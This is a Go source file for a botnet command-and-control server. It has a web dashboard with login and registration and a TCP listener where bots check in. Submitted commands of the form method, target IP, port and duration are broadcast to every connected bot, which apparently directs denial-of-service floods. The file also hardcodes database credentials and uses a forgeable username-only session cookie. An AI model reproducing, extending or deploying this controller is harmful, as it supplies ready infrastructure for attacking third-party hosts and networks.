package main

import (
	"bufio"
	"database/sql"
	"fmt"
	"html/template"
	"log"
	"net"
	"net/http"
	"strconv"
	"strings"
	"time"

	"golang.org/x/crypto/bcrypt"

	_ "github.com/go-sql-driver/mysql"
)

var (
	db             *sql.DB
	botConnections = make(map[string]net.Conn)
)

const sessionName = "session"

// User represents a user in the system.
type User struct {
	Username string
}

func main() {
	// Initialize database connection
	initDB()
	serverAddress := "birdo.local:8080"

	// Start the botnet controller listener
	go startBotListener()

	// Configure HTTP routes
	http.HandleFunc("/", indexHandler)
	http.HandleFunc("/login", loginHandler)
	http.HandleFunc("/register", registerHandler)
	http.HandleFunc("/profile", profileHandler)
	http.HandleFunc("/dashboard", dashboardHandler) // New route for dashboard
	http.HandleFunc("/logout", logoutHandler)
	http.HandleFunc("/send-command", sendCommandHandler)
	http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))

	log.Println("Server started on http://" + serverAddress)
	err := http.ListenAndServe(serverAddress, nil)
	if err != nil {
		log.Fatal("Server error:", err)
	}
}

// indexHandler handles the root route and serves the index page.
func indexHandler(w http.ResponseWriter, r *http.Request) {
	renderTemplate(w, "index.html", nil)
}

// loginHandler handles user login.
func loginHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
		username := strings.TrimSpace(r.FormValue("username"))
		password := r.FormValue("password")

		if authenticateUser(username, password) {
			setSessionCookie(w, username)
			http.Redirect(w, r, "/profile", http.StatusSeeOther)
			return
		}
	}

	renderTemplate(w, "login.html", nil)
}

// registerHandler handles user registration.
func registerHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
		username := r.FormValue("username")
		password := r.FormValue("password")

		err := createUser(username, password)
		if err != nil {
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			log.Printf("Error creating user: %v\n", err)
			return
		}

		http.Redirect(w, r, "/login", http.StatusSeeOther)
		return
	}

	renderTemplate(w, "register.html", nil)
}

// dashboardHandler displays the user's command sending.
func dashboardHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Redirect(w, r, "/login", http.StatusSeeOther)
		return
	}

	username := getUsernameFromSession(r)
	renderTemplate(w, "dashboard.html", username)
}

// profileHandler displays the user's profile.
func profileHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Redirect(w, r, "/login", http.StatusSeeOther)
		return
	}

	username := getUsernameFromSession(r)
	user, err := getUserByUsername(username)
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		log.Printf("Error retrieving user profile: %v\n", err)
		return
	}

	renderTemplate(w, "profile.html", user)
}

// sendCommandHandler handles sending commands to bots.
func sendCommandHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}

	if !isAuthenticated(r) {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	method := r.FormValue("method")
	ip := r.FormValue("ip")
	port := r.FormValue("port")
	durationStr := r.FormValue("duration")

	// Validate duration
	duration, err := strconv.Atoi(durationStr)
	if err != nil || duration < 1 || duration > 240 {
		http.Error(w, "Invalid duration", http.StatusBadRequest)
		return
	}

	command := fmt.Sprintf("%s %s %d %s", method, ip, duration, port)

	// Send command to bots
	sendToBots(command)

	// Redirect back to dashboard after sending command
	http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
}

// getUserByUsername retrieves a user from the database by username.
func getUserByUsername(username string) (*User, error) {
	var user User
	err := db.QueryRow("SELECT username FROM users WHERE username = ?", username).Scan(&user.Username)
	if err != nil {
		return nil, err
	}
	return &user, nil
}

// logoutHandler handles user logout.
func logoutHandler(w http.ResponseWriter, r *http.Request) {
	clearSessionCookie(w)
	http.Redirect(w, r, "/login", http.StatusSeeOther)
}

// renderTemplate renders an HTML template.
func renderTemplate(w http.ResponseWriter, tmpl string, data interface{}) {
	t, err := template.ParseFiles("templates/" + tmpl)
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		log.Printf("Error parsing template %s: %v\n", tmpl, err)
		return
	}

	err = t.Execute(w, data)
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		log.Printf("Error executing template %s: %v\n", tmpl, err)
	}
}

// hashPassword generates a hashed password from the given password string.
func hashPassword(password string) (string, error) {
	hashedPassword, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	if err != nil {
		return "", err
	}
	return string(hashedPassword), nil
}

// authenticateUser checks if the provided username and password are valid.
func authenticateUser(username, password string) bool {
	var storedPassword string
	err := db.QueryRow("SELECT password_hash FROM users WHERE username = ?", username).Scan(&storedPassword)
	if err != nil {
		log.Printf("Error retrieving password for username %s: %v\n", username, err)
		return false
	}

	err = bcrypt.CompareHashAndPassword([]byte(storedPassword), []byte(password))
	if err != nil {
		log.Printf("Password comparison failed for username %s: %v\n", username, err)
		return false
	}

	return true
}

// createUser creates a new user in the database.
func createUser(username, password string) error {
	hashedPassword, err := hashPassword(password)
	if err != nil {
		return err
	}

	// Incorrect number of placeholders in the INSERT statement
	_, err = db.Exec("INSERT INTO users (username, password_hash) VALUES (?, ?)", username, hashedPassword)
	return err
}

// getUsernameFromSession retrieves the username from the session cookie.
func getUsernameFromSession(r *http.Request) string {
	cookie, err := r.Cookie(sessionName)
	if err != nil {
		return ""
	}
	return cookie.Value
}

// setSessionCookie sets a session cookie with the given username.
func setSessionCookie(w http.ResponseWriter, username string) {
	expiration := time.Now().Add(24 * time.Hour)
	cookie := http.Cookie{
		Name:    sessionName,
		Value:   username,
		Expires: expiration,
		Path:    "/",
	}
	http.SetCookie(w, &cookie)
}

// clearSessionCookie clears the session cookie.
func clearSessionCookie(w http.ResponseWriter) {
	cookie := http.Cookie{
		Name:    sessionName,
		Value:   "",
		Expires: time.Now().Add(-time.Hour),
		Path:    "/",
	}
	http.SetCookie(w, &cookie)
}

// initDB initializes the database connection.
func initDB() {
	var err error
	db, err = sql.Open("mysql", "Birdo:Birdo1221.b!@tcp(192.168.1.34:3308)/net1")
	if err != nil {
		log.Fatal("Error connecting to database:", err)
	}

	err = db.Ping()
	if err != nil {
		log.Fatal("Database ping failed:", err)
	}
}

// startBotListener starts the botnet controller listener.
func startBotListener() {
	listener, err := net.Listen("tcp", ":9080")
	if err != nil {
		log.Fatal("Error starting bot listener:", err)
	}
	defer listener.Close()

	log.Println("Bot listener started on :9080")

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Println("Error accepting bot connection:", err)
			continue
		}

		// Perform bot authentication (e.g., based on bot ID)
		// For simplicity, assume bots authenticate successfully
		botID := generateBotID()
		botConnections[botID] = conn

		log.Printf("Bot %s connected from %s\n", botID, conn.RemoteAddr())

		// Handle commands sent from this bot (in a separate goroutine)
		go handleBotCommands(botID, conn)
	}
}

// generateBotID generates a unique identifier for a bot.
func generateBotID() string {
	return "bot-" + strconv.FormatInt(time.Now().UnixNano(), 10)
}

// handleBotCommands handles commands received from a bot connection.
func handleBotCommands(botID string, conn net.Conn) {
	defer conn.Close()

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		command := strings.TrimSpace(scanner.Text())
		log.Printf("Received command from Bot %s: %s\n", botID, command)

		// Optionally parse and validate commands received from bots
		// Process commands as needed
		// Example: Perform actions based on received commands

		// For simplicity, echo back to the bot for demonstration
		response := "Received command: " + command
		conn.Write([]byte(response + "\n"))
	}

	if err := scanner.Err(); err != nil {
		log.Println("Error reading from bot connection:", err)
	}

	// Remove bot from connections map upon disconnect
	delete(botConnections, botID)
}

// sendToBots sends a command to all connected bots.
func sendToBots(command string) {
	for botID, conn := range botConnections {
		_, err := conn.Write([]byte(command + "\n"))
		if err != nil {
			log.Printf("Error sending command to Bot %s: %v\n", botID, err)
			// Optionally handle failed command delivery (e.g., reconnect, logging)
		} else {
			log.Printf("Sent command to Bot %s: %s\n", botID, command)
		}
	}
}

// isAuthenticated checks if a user is authenticated based on the session cookie.
func isAuthenticated(r *http.Request) bool {
	cookie, err := r.Cookie(sessionName)
	if err != nil {
		return false
	}
	return cookie.Value != ""
}
